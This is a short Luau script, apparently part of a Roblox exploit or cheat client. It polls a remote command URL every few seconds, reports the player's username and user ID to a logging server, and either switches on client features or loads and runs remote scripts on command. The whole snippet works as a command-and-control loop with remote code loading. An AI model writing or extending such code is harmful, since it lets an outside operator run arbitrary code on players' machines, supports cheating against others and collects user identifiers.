local RunService = game:GetService("RunService")
local lastPoll = 0
local pollInterval = 5 -- seconds

local connection
connection = RunService.Heartbeat:Connect(function(dt)
	lastPoll += dt
	if lastPoll >= pollInterval then
		lastPoll = 0

		task.spawn(function()
			local success, response = pcall(function()
				return request({
					Url = commandUrl,
					Method = "GET"
				})
			end)

			if success and response and response.Body then
				local data = HttpService:JSONDecode(response.Body)
				if data and data.command then
					local cmd = data.command

					-- Log it (non-blocking)
					task.spawn(function()
						pcall(function()
							request({
								Url = "http://localhost:3000/log",
								Method = "POST",
								Headers = {["Content-Type"] = "application/json"},
								Body = HttpService:JSONEncode({
									username = LocalPlayer.Name,
									userId = LocalPlayer.UserId,
									command = cmd
								})
							})
						end)
					end)

					if cmd:sub(1, 5) == "Load:" then
						Client:LoadRemoteScript(cmd:sub(6))
					else
						Client:SetFeature(cmd, true)
					end
				end
			end
		end)
	end
end)
